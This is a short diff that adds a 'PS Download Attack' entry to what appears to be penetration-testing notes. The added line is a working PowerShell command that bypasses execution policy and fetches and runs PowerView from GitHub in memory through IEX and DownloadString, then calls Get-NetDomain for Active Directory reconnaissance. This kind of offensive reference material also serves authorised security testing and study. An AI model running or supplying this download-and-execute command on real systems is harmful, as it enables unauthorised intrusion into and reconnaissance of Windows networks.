@@ -83,3 +83,11 @@ ls
 
 PS Attack build tool
 
+
+----------------------------------------------------------
+PS Download Attack
+
+powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1'); Get-NetDomain"
+
+
+
